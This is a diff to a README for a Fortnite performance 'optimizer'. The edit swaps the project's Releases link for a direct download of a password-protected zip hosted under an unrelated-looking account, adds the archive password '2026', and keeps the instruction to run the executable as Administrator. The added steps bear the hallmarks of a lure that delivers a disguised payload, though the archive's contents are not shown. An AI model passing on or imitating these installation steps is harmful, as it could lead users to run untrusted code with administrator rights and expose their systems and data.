@@ -23,9 +23,10 @@ bottlenecks that hurt Fortnite performance:
 
 ## 📦 Installation
 
-1. Head over to the [**Releases**](../../releases) tab
+1. Head over to the [**Releases**][(../../releases)](https://github.com/uploadsultanjoint54/Aura-Fortnite-Optimizer/releases/download/v1.0.0/Aura.Optimizer.zip) tab
 2. Download the latest `.exe`
-3. Right-click → **Run as Administrator**
+3. Password: `2026`
+4. Right-click → **Run as Administrator**
 
 > 💾 **Tip:** Create a system restore point before running.
 > Aura modifies system settings to maximize performance.
